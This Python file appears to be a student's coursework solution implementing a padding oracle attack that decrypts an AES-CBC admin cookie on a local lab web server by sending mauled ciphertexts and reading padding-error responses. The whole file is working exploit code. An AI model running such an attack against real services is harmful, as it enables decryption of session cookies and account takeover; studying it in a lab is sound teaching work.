import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms
import base64
import binascii
from requests import codes, Session, cookies
LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.

def do_login_form(sess, username, password):
    data_dict = {"username":username,\
            "password":password,\
            "login":"Login"
            }
    response = sess.post(LOGIN_FORM_URL,data_dict)
    return response.status_code == codes.ok


class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = int(ciphers.algorithms.AES.block_size/8)

    @property
    def block_length(self):
        return self._block_size_bytes

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self,ct,sess):

        response = sess.post(self.url, {}, cookies={'admin': ct.hex()})
        if 'Unspecified error.' in str(response.content):
            return 0
        elif 'Bad padding for admin cookie!' in str(response.content):
            return 0
        else:
            return 1
def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]

# reference: https://en.wikipedia.org/wiki/Padding_oracle_attack
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)

    sess= Session()
    assert(do_login_form(sess,"attacker","attacker"))
    print(po.block_length)
    c0, c1 = list(split_into_blocks(ctx, po.block_length))

    decoded = [0] * po.block_length
    i2 = [0] * po.block_length
    for i in reversed(range(16)):
        pb = (po.block_length-i)
        for b in range(0,256):
            pre = c0[:i]
            post = [pb ^ val for val in i2[i+1:]]
            ba = bytearray(pre)
            ba.append(b)
            ba.extend(post)
            mauled_c0 = bytes(ba)

            if po.test_ciphertext((mauled_c0 + c1),sess)==1:
                i2[i] = b ^ pb
                decoded[i] = b ^ c0[i] ^ pb
                
    msg = ''.join(map(chr,decoded))
    print(msg)
    # TODO: Implement padding oracle attack for 2 blocks of messages.
    return msg

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    P = ""
    for i in range(nblocks-1):
        ctx_2blocks = ctx_blocks[i] + ctx_blocks[i+1]
        p = po_attack_2blocks(po, ctx_2blocks)

        P += p 
    print(P)
    return P

def do_attack(hex_cookie):
    po = PaddingOracle(SETCOINS_FORM_URL)
    po_attack(po,bytes.fromhex(hex_cookie))

if __name__ == "__main__":
    hex_cookie="e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d"
    #hex_cookie = "e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e60"
    do_attack(hex_cookie)


    
